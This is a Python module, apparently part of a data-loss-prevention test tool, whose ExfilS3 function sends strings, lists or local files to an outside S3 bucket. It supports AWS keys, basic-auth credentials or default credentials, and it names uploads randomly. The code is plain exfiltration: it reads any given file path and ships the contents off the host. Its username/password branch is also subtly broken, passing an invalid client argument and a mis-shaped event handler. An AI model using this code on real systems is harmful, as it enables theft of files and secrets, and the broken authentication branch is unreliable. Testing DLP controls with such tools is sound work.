import logging
import boto3
import botocore
import os
import base64
import random
import string

def ExfilS3(bucket_name, data, File=False, aws_access_key_id=None, aws_secret_access_key=None, aws_session_token=None, username=None, password=None):
    logging.debug("Exfiltrating data to S3 bucket: {}".format(bucket_name))

    # Create an S3 client
    if aws_access_key_id and aws_secret_access_key:
        logging.debug("Using AWS token credentials")
        s3 = boto3.client('s3', aws_access_key_id=aws_access_key_id, aws_secret_access_key=aws_secret_access_key, aws_session_token=aws_session_token)
    elif username and password:
        logging.debug("Using AWS username and password credentials")
        auth = base64.b64encode(f"{username}:{password}".encode('utf-8')).decode('utf-8')
        s3 = boto3.client('s3', config=boto3.session.Config(signature_version=botocore.UNSIGNED), s3={'addressing_style': 'path'})
        s3.meta.events.register('before-sign.s3', lambda event: event.params['headers'].update({'Authorization': f'Basic {auth}'}))
    else:
        logging.debug("Using AWS default credentials")
        s3 = boto3.client('s3')

    def genRandomFilename():
        word = ""
        for _ in range(8):
            word += random.choice(string.ascii_letters)
        return word

    if not File:
        if isinstance(data, list):
            logging.debug("Data is a list, converting to string")
            data = ','.join(data)
            data = data.encode('utf-8')
        else:
            logging.debug("Data is not a list, converting to string")
            data = data.encode('utf-8')

        # Generate a random filename for the object in S3
        key = f"dlpd_aws_{genRandomFilename()}.txt"
        logging.debug(f"Generated random filename: {key}")

        try:
            logging.debug("Attempting to exfiltrate data to S3")
            s3.put_object(Body=data, Bucket=bucket_name, Key=key)
            logging.debug("Data exfiltration over S3 successful!")
            return True
        except Exception as e:
            logging.error(f"S3 Data exfiltration failed: {e}")
            return False
    else:
        if data == "":
            logging.debug("No file data to exfiltrate")
            return False
        else:
            if not os.path.isfile(data):
                logging.debug("S3 testcase Filepath does not exist")
                return False
            else:
                # The key is the filename in this case
                key = os.path.basename(data)
                try:
                    with open(data, "rb") as file_data:
                        logging.debug("Attempting to exfiltrate file data to S3")
                        s3.put_object(Body=file_data, Bucket=bucket_name, Key=key)
                        logging.debug("File data exfiltration over S3 successful!")
                    return True
                except Exception as e:
                    logging.debug(f"File data exfiltration over S3 failed: {e}")
                    return False
